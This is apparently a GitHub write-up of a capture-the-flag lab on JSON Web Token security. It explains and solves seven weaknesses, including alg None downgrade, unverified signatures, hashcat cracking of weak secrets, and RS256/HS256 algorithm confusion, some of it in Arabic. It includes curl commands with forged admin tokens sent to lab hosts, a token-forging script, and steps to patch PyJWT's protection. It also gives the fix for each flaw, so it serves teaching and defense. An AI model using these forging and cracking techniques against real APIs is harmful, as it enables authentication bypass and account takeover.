# JWT Security

<img width="1902" height="357" alt="image" src="https://github.com/user-attachments/assets/47163caa-6e2c-41d2-ae67-0ebba4ebf141" />



<details>
  <summary>Token-Based Authentication</summary>


The Rise of APIs

Application Programming Interfaces, or APIs for short, have become incredibly popular today. One of the key reasons for this boom is the ability to create a single API that can then serve several different interfaces, such as a web application and mobile application, at the same time. This allows the same server-side logic to be centralised and reused for all interfaces. From a security perspective, this is also usually beneficial as it means we can implement the server-side security in a single API that would then protect our server regardless of the interface that is being used.

However, new session management methods were also created with the rise of APIs. As cookies are usually associated with web applications used through a browser, cookie-based authentication for APIs usually doesn't work as well since the solution is then not agnostic for other interfaces. This is where token-based session management comes in to save the day.

Token-Based Session Management

Token-based session management is a relatively new concept. Instead of using the browser's automatic cookie management features, it relies on client-side code for the process. After authentication, the web application provides a token within the request body. Using client-side JavaScript code, this token is then stored in the browser's LocalStorage.

When a new request is made, JavaScript code must load the token from storage and attach it as a header. One of the most common types of tokens is JSON Web Tokens (JWT), which are passed through the `Authorization: Bearer` header. However, as we are not using the browser's built-in cookie management features, it is a bit of the wild west where anything goes. Although there are standards, nothing is forcing anything from sticking to these standards. Tokens like JWTs are a way to standardise token-based session management.

API Project

During this room, you will perform exploitation against several APIs. APIs can be documented using several different methods. One popular method is creating a [Postman](https://www.postman.com/) project or a [Swagger](https://swagger.io/) file. While we encourage you to experiment with these solutions, they require you to have an account, which we avoid forcing in this room. Instead, a simplified explanation of the API is provided below. The API remains consistent for all examples except for the last one, which has additional features. As you work through the exercises, refer to this section for guidance. The API was developed in Python Flask. As such, the coding examples will be in Python.

**API Endpoints**

The API project has a single API endpoint, namely <http://10.64.188.53/api/v1.0/exampleX>. The `X` is replaced by the number of the example. This endpoint accesses two HTTP methods:

-   **POST**: To authenticate and receive your JWT, you need to make a POST request with the credentials provided in JSON format.
-   **GET**: To get details about your user and ultimately perform the privilege escalation to recover your task flag.

**API Credentials**

To authenticate to the API, a JSON body with the credentials needs to be sent as follows:

-   **username**: user
-   **password**: passwordX

The `X` needs to be replaced with the number of the example.

**API Examples**

Below are the two cURL requests you can use to interface with the API. For authentication, the following cURL request can be made:


```json
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.64.188.53/api/v1.0/example1
```

<img width="1175" height="230" alt="image" src="https://github.com/user-attachments/assets/92aa531f-3788-451c-beca-41d6c523c6aa" />

```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U"
}

```

---

#### For user verification, the following cURL request can be made:

```
curl -H 'Authorization: Bearer [JWT token]' http://10.64.188.53/api/v1.0/example2?username=Y
```

> The [JWT token] component has to be replaced with the JWT received from the first request. In this case, Y can be either user or admin, depending on your permissions.


```
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U' http://10.64.188.53/api/v1.0/example2?username=user
```

<img width="1169" height="318" alt="image" src="https://github.com/user-attachments/assets/3a2e9071-d352-469e-be64-69415a1e40af" />



**API Permissions**

The main goal in each example is to gain admin privileges and verify these permissions. Once you have a valid JWT where admin is set to 1, you can request the details of the admin user. This will return your flag. The process will be shown for the first example, but you will have to copy the steps for the rest of the examples.

Start the Machine

Now that you understand the API structure, it is almost time to get stuck in. Start the machine by pressing the **Start Machine** button in the right corner. You may access the VM using the AttackBox or your VPN connection. While the machine boots, let's explore how JWTs work.




<img width="1663" height="227" alt="image" src="https://github.com/user-attachments/assets/45a8d025-b3ef-4a75-9518-37cdef405111" />






  
</details>





<details>
  <summary>JSON Web Tokens</summary>



<img width="1607" height="478" alt="image" src="https://github.com/user-attachments/assets/056080c9-a65d-4b3c-bc51-d1f610fd8a3d" />

---

<img width="1604" height="540" alt="image" src="https://github.com/user-attachments/assets/3adc16c6-8a75-4cb8-afbf-31a0cec7bb78" />


---
---

<img width="1663" height="511" alt="image" src="https://github.com/user-attachments/assets/c7210086-3b5d-4f37-91a8-028f67d404bb" />







  
</details>













<details>
   <summary>Sensitive Information Disclosure</summary>


### Sensitive Information Disclosure

The first common issue we will dive into is the exposure of sensitive information within the JWT.

A common cookie-based session management approach is using the server-side session to store several parameters. In PHP, for example, you can use $SESSION['var']=data to store a value associated with the user's session. These values are not exposed client-side and can therefore only be recovered server-side. However, with tokens, the claims are exposed as the entire JWT is sent client-side. If the same development practice is followed, sensitive information can be disclosed. Some examples are seen on real applications:

-   Credential disclosure with the password hash, or even worse, the clear-text password being sent as a claim.
-   Exposure of internal network information such as the private IP or hostname of the authentication server.

**Practical Example 1\
**

Let's take a look at a practical example. Let's authenticate to our API using the following cURL request:

`curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.64.188.53/api/v1.0/example1`



```json
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.64.188.53/api/v1.0/example1
```

<img width="1175" height="230" alt="image" src="https://github.com/user-attachments/assets/92aa531f-3788-451c-beca-41d6c523c6aa" />

```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U"
}

```


This will provide you with a JWT token. Once recovered, decode the body of the JWT to uncover sensitive information. You can decode the body manually or use a website such as [JWT.io](https://jwt.io/) for this process.

**The Development Mistake**

In the example, sensitive information was added to the claim, as shown below:

```
payload = {
    "username" : username,
    "password" : password,
    "admin" : 0,
    "flag" : "[redacted]"
}

access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```

**The Fix**

Values such as the password or flag should not be added as claims as the JWT will be sent client-side. Instead, these values should be securely stored server-side in the backend. When required, the username can be read from a verified JWT and used to lookup these values, as shown in the example below:

```
payload = jwt.decode(token, self.secret, algorithms="HS256")

username = payload['username']
flag = self.db_lookup(username, "flag")
```


















<img width="1200" height="430" alt="image" src="https://github.com/user-attachments/assets/084f23e5-bbb5-49af-8736-d37448e71b52" />


---

<img width="1649" height="211" alt="image" src="https://github.com/user-attachments/assets/03aa525b-73d2-452e-8a99-a30496a941a9" />



  
</details>






<details>
  <summary>Signature Validation Mistakes</summary>


The second common mistake with JWTs is not correctly verifying the signature. If the signature isn't correctly verified, a threat actor may be able to forge a valid JWT token to gain access to another user's account. Let's examine the common signature verification issues.

Not Verifying the Signature

The first issue with signature validation is when there is no signature validation. If the server does not verify the signature of the JWT, then it is possible to modify the claims in the JWT to whatever you prefer them to be. While it is uncommon to find APIs where no signature validation is performed, signature validation may have been omitted from a single endpoint within the API. Depending on the sensitivity of the endpoint, this can have a significant business impact.

**Practical Example 2**

Let's authenticate to the API:

`curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://MACHINE_IP/api/v1.0/example2`

Once authenticated, let's verify our user:

`curl -H 'Authorization: Bearer [JWT Token]' http://MACHINE_IP/api/v1.0/example2?username=user`

However, let's try to verify our user without the signature, remove the third part of the JWT (leaving only the dot) and make the request again. You will see that the verification still works! This means that the signature is not being verified. Modify the admin claim in the payload to be `1` and try to verify as the admin user to retrieve your flag.

**The Development Mistake**

In the example, the signature is not being verified, as shown below:

```
payload = jwt.decode(token, options={'verify_signature': False})
```

﻿While it is rare to see this on normal APIs, it often happens on server-to-server APIs. In cases where a threat actor has direct access to the backend server, JWTs can be forged.

**The Fix**

The JWT should always be verified or additional authentication factors, such as certificates, should be used for server-to-server communication. The JWT can be verified by providing the secret (or public key), as shown in the example below:

```
payload = jwt.decode(token, self.secret, algorithms="HS256")
```

Downgrading to None

Another common issue is a signature algorithm downgrade. JWTs support the `None` signing algorithm, which effectively means that no signature is used with the JWT. While this may sound silly, the idea behind this in the standard was for server-to-server communication, where the signature of the JWT was verified in an upstream process. Therefore, the second server would not be required to verify the signature. However, suppose the developers do not lock in the signature algorithm or, at the very least, deny the `None` algorithm. In that case, you can simply change the algorithm specified in your JWT as `None`, which would then cause the library used for signature verification to always return true, thus allowing you again to forge any claims within your token.

**Practical Example 3\
**

Authenticate to the API to receive your JWT and then verify your user. To perform this attack, you will need to manually alter the  the `alg` claim in the header to be `None`. You can use [CyberChef](https://gchq.github.io/CyberChef/) for this making use of the URL-Encoded Base64 option. Submit the JWT again to verify that it is still accepted, even if the signature is no longer valid, as changes have been made. You can then alter the `admin` claim to recover the flag.

**The Development Mistake**

While this may seem like the same issue as before, from a development perspective, it is slightly more complex. Sometimes, developers want to ensure their implementation accepts several JWT signature verification algorithms. The implementation would then usually read the header of the JWT and parse found alg into the signature verification component, as shown below:

```
header = jwt.get_unverified_header(token)

signature_algorithm = header['alg']

payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
```

However, when the threat actor specified `None` as the algorithm, signature verification is bypassed. [Pyjwt](https://pyjwt.readthedocs.io/en/stable/), the JWT library used in this room, has implemented security coding to prevent this issue. If a secret is specified when the None algorithm is selected, an exception is raised.**\
**

**The Fix**

If multiple signature algorithms should be supported, the supported algorithms should be supplied to the decode function as an array list, as shown below:

```
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")

```

Weak Symmetric Secrets

If a symmetric signing algorithm is used, the security of the JWT relies on the strength and entropy of the secret used. If a weak secret is used, it may be possible to perform offline cracking to recover the secret. Once the secret value is known, you can again alter the claims in your JWT and recalculate a valid signature using the secret.

**Practical Example 4\
**

For this example, a weak secret was used to generate the JWT. Once you receive a JWT, you have several options to crack the secret. For our example, we will talk about using [Hashcat](https://hashcat.net/hashcat/) to crack the JWT's secret. You could also use other solutions such as [John](https://www.openwall.com/john/) as well. You can use the following steps to crack the secret:

1.  Save the JWT to a text file called jwt.txt.
2.  Download a common JWT secret list. For this room, you can use `wget https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list` to download such a list.
3.  Use Hashcat to crack the secret using `hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list`

Once you know what the secret is, you can forge a new admin token to recover the flag!

**The Development Mistake**

The issue occurs when a weak JWT secret is used. This can often occur when developers are in a hurry or copy code from examples.

**The Fix**

A secure secret value should be selected. As this value will be used in software and not by humans, a long, random string should be used for the secret.

Signature Algorithm Confusion

The last common issue with signature validation is when an algorithm confusion attack can be performed. This is similar to the `None` downgrade attack, however, it specifically happens with confusion between symmetric and asymmetric signing algorithms. If an asymmetric signing algorithm, for example, RS256 is used, it may be possible to downgrade the algorithm to HS256. In these cases, some libraries would default back to using the public key as the secret for the symmetric signing algorithm. Since the public key can be known, you can forge a valid signature by using the HS256 algorithm in combination with the public key.

**Practical Example 5\
**

This is similar to example 3. Except this time, the None algorithm is not allowed. However, once you authenticate to the example, you will also receive the public key. As the public key isn't regarded as sensitive, it is common to find the public key. Sometimes, the public key is even embedded as a claim in the JWT. In this example, you must downgrade the algorithm to HS256 and then use the public key as the secret to sign the JWT. You can use the script provided below to assist you in forging this JWT:

```
import jwt

public_key = "ADD_KEY_HERE"

payload = {
    'username' : 'user',
    'admin' : 0
}

access_token = jwt.encode(payload, public_key, algorithm="HS256")
print (access_token)
```

Note: We recommend that you use the AttackBox for this practical example since Pyjwt is already installed for you. Before running the script, edit the file `/usr/lib/python3/dist-packages/jwt/algorithms.py` using your favorite text editor and go to line `143`. Then proceed to comment out lines `143-146` and run the script. If you are using your own VM, you may have to install Pyjwt (`pip3 install pyjwt`) to use this script. You will also need to tamper with the Pyjwt library's algorithm.py file on line `258` to remove the `is_ssh_key` condition as a patch for this vulnerability was released. Keep in mind that this placement can vary per VM and installation. An easier method if you are not comfortable with library code edits is to make use of [jwt.io](https://jwt.io/). Once you verify it works, you can alter the claims to make yourself an admin and recover the flag.

**The Development Mistake**

The mistake in this example is similar to that of example 3 but a bit more complex. While the None algorithm is disallowed, the key issue stems from both symmetric and asymmetric signature algorithms being allowed, as shown in the example below:

```
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"])
```

Care should be given never to mix signature algorithms together as the secret parameter of the decode function can be confused between being a secret or a public key.**\
**

**The Fix**

While both types of signature algorithms can be allowed, a bit more logic is required to ensure that there is no confusion, as shown in the example below:

```
header = jwt.get_unverified_header(token)

algorithm = header['alg']
payload = ""

if "RS" in algorithm:
    payload = jwt.decode(token, self.public_key, algorithms=["RS256", "RS384", "RS512"])
elif "HS" in algorithm:
    payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])

username = payload['username']
flag = self.db_lookup(username, "flag")
```



---
---


```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.65.159.101/api/v1.0/example2
```



```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
}
```

> #### Once authenticated, let's verify our user:

```
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' http://10.65.159.101/api/v1.0/example2?username=user
```


<img width="1346" height="217" alt="image" src="https://github.com/user-attachments/assets/c3070bfb-6476-4a28-8569-31123a7347e1" />

### let's try to remove signiature and change 0 to 1 


<img width="1241" height="403" alt="image" src="https://github.com/user-attachments/assets/43b7d0ab-08e2-4660-8a56-0672a3cb6193" />


```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyAgInVzZXJuYW1lIjogInVzZXIiLCAgImFkbWluIjogMX0=
```


## now let's verify as admin

```
curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyAgInVzZXJuYW1lIjogInVzZXIiLCAgImFkbWluIjogMX0=.' http://10.65.159.101/api/v1.0/example2?username=admin
```


<img width="1332" height="222" alt="image" src="https://github.com/user-attachments/assets/ae6344a7-56db-4aa7-884c-c7412383daa8" />


## `Downgrading to None`


```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password3" }' http://10.65.159.101/api/v1.0/example3
```

<img width="1332" height="195" alt="image" src="https://github.com/user-attachments/assets/83f07061-e2cd-486b-affd-1622e09fa852" />


```json
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
}
```



<img width="1274" height="406" alt="image" src="https://github.com/user-attachments/assets/e65b9ae8-29ff-4a11-844a-8047723e1cb2" />





```
curl -H 'Authorization: Bearer eyAgInR5cCI6ICJKV1QiLCAgImFsZyI6ICJOb25lIn0=.eyAgInVzZXJuYW1lIjogImFkbWluIiwgICJhZG1pbiI6IDF9.' http://10.65.159.101/api/v1.0/example3?username=admin
```


## `Weak Symmetric Secrets`


```
 curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password4" }' http://10.65.159.101/api/v1.0/example4 
```

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY
```


<img width="1300" height="617" alt="image" src="https://github.com/user-attachments/assets/c897d54f-7822-4d3c-a9ed-f31f2671b91b" />


```
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
```


<img width="1354" height="503" alt="image" src="https://github.com/user-attachments/assets/57b65f66-d6f7-4016-b27e-66c855afb3a0" />



```
secret
```




<img width="768" height="604" alt="image" src="https://github.com/user-attachments/assets/3eb674ca-aeda-4455-8ae7-673a6892b700" />




<img width="1366" height="163" alt="image" src="https://github.com/user-attachments/assets/71f482db-3625-4a42-af97-13bd77887a1f" />




## `Signature Algorithm Confusion`




<details>
  <summary>explain in arabic</summary>


🔐 Signature Algorithm Confusion Attack (JWT)
=============================================

الفكرة في سطر واحد
------------------

> **السيرفر يفتكر إنه بيستخدم RSA (public/private key)،\
> والمهاجم يخليه يصدّق توكن متوقّع بـ HMAC باستخدام الـ public key كـ secret** 😈

وده يحصل بسبب **خلط بين algorithms symmetric و asymmetric**.

* * * * *

🧠 نراجع الأساسيات بسرعة
------------------------

### 1️⃣ HS256 (Symmetric)

-   نفس المفتاح:

    -   للتوقيع ✍️

    -   وللتحقق ✔️

-   اسمه: **secret**

`secret  → sign
secret  → verify`

* * * * *

### 2️⃣ RS256 (Asymmetric)

-   مفتاحين:

    -   private key → sign

    -   public key → verify

`private key → sign
public key  → verify`

* * * * *

🔥 فين الغلطة بقى؟
------------------

السيرفر بيقول:

> أنا بدعم HS256 و RS256 مع بعض

`jwt.decode(token, secret, algorithms=[
  "HS256","HS384","HS512",
  "RS256","RS384","RS512"
])`

💣 **كارثة**

ليه؟

لأن:

-   `secret` هنا:

    -   في HS = secret حقيقي

    -   في RS = المفروض public key

-   السيرفر **مش بيفرق**

* * * * *

🧨 السيناريو الهجومي (اللي بيحصل فعليًا)
----------------------------------------

### 👣 الخطوات:

#### 1️⃣ السيرفر أصلاً بيستخدم RS256

يعني التوكن الطبيعي شكله:

`{
  "alg": "RS256",
  "typ": "JWT"
}`

#### 2️⃣ المهاجم يحصل على **public key**

وده طبيعي جدًا:

-   endpoint

-   embedded في JWT

-   ملف `.well-known`

-   أو حتى في الصفحة

> 🔑 public key **مش سرّي**

* * * * *

#### 3️⃣ المهاجم يغير الـ header

من:

`"alg": "RS256"`

إلى:

`"alg": "HS256"`

* * * * *

#### 4️⃣ المهاجم يعمل توقيع جديد

لكن بـ:

`secret = public key
algorithm = HS256`

📌 **ليه ده يشتغل؟**

لأن:

-   HS256 محتاج secret

-   السيرفر هيستخدم نفس المتغير (`secret`)

-   وهو أصلًا حاطط فيه الـ public key

😵‍💫 **السيرفر يتلخبط**

* * * * *

✅ النتيجة
---------

السيرفر يقول:

> ✔️ التوقيع صحيح\
> ✔️ المستخدم admin\
> ❌ اتخدعنا




  
</details>





```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password5" }' http://10.65.159.101/api/v1.0/example5
```

<img width="1333" height="373" alt="image" src="https://github.com/user-attachments/assets/20177db6-41d9-4c82-a41e-786a3cf97e81" />


```json
{
  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
}

```





<img width="1597" height="688" alt="image" src="https://github.com/user-attachments/assets/3674dfc4-1e73-4def-af71-ae338e0ada52" />




















  
</details>








<details>
  <summary>JWT Lifetimes</summary>


Token Lifetime

Before verifying the signature of the token, the lifetime of the token should be calculated to ensure that the token has not expired. This is usually performed by reading the `exp` (expiration time) claim from the token and calculating if the token is still valid.

A common issue is if the `exp` value is set too large (or not set at all), the token would be valid for too long or might even never expire. With cookies, the cookie can be expired server-side. However, JWTs do not have this same feature built-in. If we want to expire a token before the `exp` time, we must keep a blocklist of these tokens, breaking the model of decentralised applications using the same authentication server. Therefore, the care should be given to choose the correct `exp` value, given the application's functionality. For example, a different `exp` value is probably used between a mail server and a banking application.

Another approach is to use refresher tokens. If you are going to test an  API that uses JWTs, it is recommended that you do some research into these.

**Practical Example 6\
**

In this example, the JWT implementation did not specify an exp value, meaning tokens are permanently persistent. Use the token below to recover your flag:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU
```

**The Development Mistake**

As mentioned above, the JWT does not have an `exp` value, meaning it will be persistent. In the event that an `exp` claim isn't present, most JWT libraries would accept the token as valid if the signature is verified.

**The Fix**

An `exp` value should be added to the claims. Once added, most libraries will include reviewing the expiry time of the JWT into their checks for validity. This can be done as shown in the example below:

```js
lifetime = datetime.datetime.now() + datetime.timedelta(minutes=5)

payload = {
    'username' : username,
    'admin' : 0,
    'exp' : lifetime
}

access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```


---




```
curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU
' http://10.65.159.101/api/v1.0/example6?username=admin
```


<img width="1323" height="233" alt="image" src="https://github.com/user-attachments/assets/85a3826d-57db-44d5-88f8-44669336aed6" />


  
</details>








<details>
  <summary>Cross-Service Relay Attacks</summary>




The last common misconfiguration we will review is a Cross-Service misconfiguration. As mentioned before, JWTs are often used in systems with a centralised authentication system that serves multiple applications. However, in some cases, we may want to restrict which applications are accessed with a JWT, especially when there are claims that should only be valid for certain applications. This can be done by using the audience claim. However, if the audience claim isn't correctly enforced, a Cross-Service Relay attack can be executed to perform a privilege escalation attack.

#### `The Audience Claim`

JWTs can have an audience claim. In cases where a single authentication system serves multiple applications, the audience claim can indicate which application the JWT is intended for. However, the enforcement of this audience claim has to occur on the application itself, not the authentication server. If this claim is not verified, as the JWT itself is still regarded as valid through signature verification, it can have unintended consequences.

An example of this is if a user has admin privileges or a higher role on a certain application. The JWT allocated to the user usually has a claim that indicates this, such as `"admin" : true`. However, that same user is perhaps not an admin on a different application served by the same authentication system. If the audience claim is not verified on this second application, which also makes use of its admin claim, the server may mistakenly believe that the user has admin privileges. This is called a Cross-Service Relay attack, as shown in the animation below:


<img width="1082" height="787" alt="image" src="https://github.com/user-attachments/assets/5ca883fd-9412-47e2-8bad-b556a95632d2" />


Let's take a look at a practical example.

**Practical Example 7\
**

For this last practical example, there are two API endpoints namely `example7_appA` and `example7_appB`. You can use the same GET request you made in the previous examples to recover the flag, but you will need to point it to these endpoints. Furthermore, for authentication, you now also have to include the `"application" : "appX"` data value in the login request made to `example7`. Use the following steps to perform the example:

1.  Authenticate to `example7` using the following data segment: `'{ "username" : "user", "password" : "password7", "application" : "appA"}'`. You will notice that an audience claim is added, but that you are not an admin.

2.  Use this token in both the admin and user requests you make to `example7_appA` and `example7_appB`. You will notice that while appA accepts the token, you are not an admin, and appB does not accept the token as the audience is incorrect.
3.  Authenticate to `example7` using the following data segment: `'{ "username" : "user", "password" : "password7", "application" : "appB"}'`. You will notice that an audience claim is added again and you are an admin this time.
4.  Use this token again to verify yourself on both applications and see what happens.

You can use this to now recover your flag.

**The Development Mistake**

The key issue is that the audience claim is not being verified on appA. This can be either because audience claim verification has been turned off or the audience scope has been set too wide.

**The Fix**

The audience claim should be verified when the token is decoded. This can be done as shown in the example below:

```
payload = jwt.decode(token, self.secret, audience=["appA"], algorithms="HS256")
```


---


<details>
  <summary>explan=================</summary>



🔥 Cross‑Service JWT Misconfiguration (Audience Claim)
======================================================

الفكرة الأساسية
---------------

في شركات كتير:

-   عندها **Authentication Server واحد**

-   بيطلع JWTs

-   وبيخدم **أكتر من تطبيق**\
    مثال:

    -   appA (User Portal)

    -   appB (Admin / Internal Tool)

عشان كده اتعمل **claim اسمه `aud` (Audience)**\
بيقول:

> التوكن ده معمول لمين؟

* * * * *

🧠 المشكلة بتحصل إزاي؟
----------------------

لو **التطبيق نفسه** ماعملش تحقق من `aud`\
والتوكن:

-   توقيعه صحيح ✔️

-   فيه `admin: true` ✔️

👉 التطبيق هيصدق التوكن حتى لو معمول لتطبيق تاني\
وده اسمه:

> **Cross‑Service Relay Attack**

* * * * *

🧪 سيناريو عملي (ببساطة)
------------------------

### 🔹 التطبيقين:

| التطبيق | صلاحياتك |
| --- | --- |
| appA | User عادي ❌ Admin |
| appB | Admin ✅ |

* * * * *

### 🧩 الخطوة 1 -- Login على appA

`{
  "username": "user",
  "password": "password7",
  "application": "appA"
}`

النتيجة:

`{
  "aud": "appA",
  "admin": false
}`

✔️ التوكن شغال على appA\
❌ مش Admin\
❌ appB يرفضه (aud غلط)

* * * * *

### 🧩 الخطوة 2 -- Login على appB

`{
  "username": "user",
  "password": "password7",
  "application": "appB"
}`

النتيجة:

`{
  "aud": "appB",
  "admin": true
}`

* * * * *

### 💣 الخطوة الخطيرة

تاخد **توكن appB (Admin)**\
وتبعته لـ **appA**

لو appA:

-   ❌ ما بيتحققش من `aud`

-   ✔️ بس بيشوف `admin: true`

👉 appA هيعاملك كـ **Admin**\
🔥 **Privilege Escalation**

* * * * *

🚨 ليه ده خطير؟
---------------

-   نفس المستخدم

-   نفس التوكن

-   لكن صلاحيات مختلفة حسب التطبيق

والسيرفر:

> "التوقيع صح؟ خلاص عدّي" ❌

* * * * *

❌ الخطأ البرمجي (Development Mistake)
-------------------------------------

`jwt.decode(token, secret, algorithms=["HS256"])`

-   مفيش تحقق من `aud`

-   أي توكن متوقع صح → مقبول

* * * * *

✅ الحل الصح (The Fix)
---------------------

`jwt.decode(
  token,
  secret,
  audience=["appA"],
  algorithms=["HS256"]
)`

يعني:

-   التوكن لازم يكون معمول لـ appA

-   غير كده ❌ مرفوض

* * * * *

🧠 إزاي تكتشفه في CTF / Pentest؟
--------------------------------

دور على:

-   أكتر من application

-   JWT فيه `aud`

-   صلاحيات مختلفة حسب التطبيق

وجرّب:

-   خُد توكن Admin من Service

-   استخدمه على Service تاني



  
</details>



---
---



```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appA" }' http://10.66.129.218/api/v1.0/example7
```

<img width="1353" height="223" alt="image" src="https://github.com/user-attachments/assets/7c682480-1202-4ee9-9ca1-4f6d5978db2b" />


```
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4"
}
```

---

```
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appB" }' http://10.66.129.218/api/v1.0/example7
```

<img width="1402" height="208" alt="image" src="https://github.com/user-attachments/assets/079dbe07-9ea8-4bd2-b9e3-923ed1587231" />



```
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o"
}
```

> ## now user JWT of appB in AppA  


```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o" \
http://10.66.129.218/api/v1.0/example7_appA?username=admin
```



<img width="1319" height="200" alt="image" src="https://github.com/user-attachments/assets/4b3d7f08-d082-4d65-ba42-30ea751b6c86" />





  
</details>






<details>
  <summary>Conclusion</summary>


Conclusion

In this room, several common misconfigurations and vulnerabilities with JWT implementations were showcased. As a summary, take note of the following:

-   As JWTs are sent client-side and encoded, sensitive information should not be stored in their claims.
